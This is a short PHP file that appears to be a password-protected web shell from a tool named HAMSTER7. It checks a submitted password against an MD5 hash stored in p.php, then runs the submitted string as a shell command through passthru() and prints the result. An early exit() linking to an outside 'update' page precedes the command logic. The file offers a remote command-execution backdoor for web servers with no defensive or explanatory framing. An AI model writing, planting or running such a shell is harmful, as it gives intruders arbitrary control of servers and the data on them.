<?php /*28.07.16 
cmd
s.php?cmd=pass~order 
*/
exit('[X] <a href="http://www.gst-samara.ru/hamster/" target="_blank">Update HAMSTER7</a>');

if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

if(!isset($s[1])){exit('[X] cmd: not comand');}

passthru($s[1], $t);
//echo iconv("windows-1251", "KOI8-R", $t);
//echo iconv("windows-1251", "KOI8-R", $t);
//echo mb_detect_encoding($t);//определение кодировки
//$t = ("ASCII", "UTF-8", $t);
echo $t;
?>